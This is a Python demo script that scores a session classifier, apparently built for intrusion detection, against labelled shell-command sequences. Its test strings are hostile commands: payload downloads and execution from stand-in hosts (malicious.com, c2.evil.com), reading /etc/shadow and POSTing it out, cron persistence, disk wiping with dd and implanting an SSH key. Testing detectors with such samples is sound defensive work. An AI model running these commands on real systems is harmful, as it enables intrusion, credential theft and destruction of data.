#!/usr/bin/env python3
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from training.neural.hybrid_classifier_v2 import HybridClassifierV2
from core.mitre.session_annotator import annotate_session

# Demo test cases
demo_tests = [
    ("Safe", "ls -la; pwd; whoami; cat README.md"),
    ("Recon", "nmap -sS 192.168.1.0/24; netstat -tulpn; cat /etc/hosts; ps aux | grep ssh"),
    ("Downloader", "cd /tmp; wget http://malicious.com/bot.sh; chmod +x bot.sh; ./bot.sh"),
    ("Exploit", "cat /etc/shadow; cat /etc/passwd; find / -name '*.pem' 2>/dev/null"),
    ("Destructive", "rm -rf /var/log/*; history -c; dd if=/dev/zero of=/dev/sda bs=1M"),
    ("ADVANCED_APT", "wget http://c2.evil.com/implant; chmod +x implant; ./implant; cat /etc/shadow > /tmp/creds; curl -X POST http://c2.evil.com/exfil -d @/tmp/creds; echo '* * * * * /tmp/implant' >> /var/spool/cron/root; chattr +i /tmp/implant"),
    ("Destructive", "cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArD...' > .ssh/authorized_keys; chmod 600 .ssh/authorized_keys; chattr +ia .ssh"),
]

classifier = HybridClassifierV2()
correct = 0
total = len(demo_tests)

print("Testing Hybrid Classifier on Demo Cases:")
print("=" * 70)
for expected, commands in demo_tests:
    mitre_analysis = annotate_session(commands)
    pred_class, pred_name, _ = classifier.classify(commands, mitre_analysis)
    is_correct = (pred_name == expected)
    correct += is_correct
    status = "[OK]" if is_correct else "[FAIL]"
    print(f"{status:6} {expected:15} -> {pred_name:15} | Commands: {commands[:50]}...")

print("=" * 70)
print(f"Accuracy: {correct}/{total} ({100*correct/total:.1f}%)")
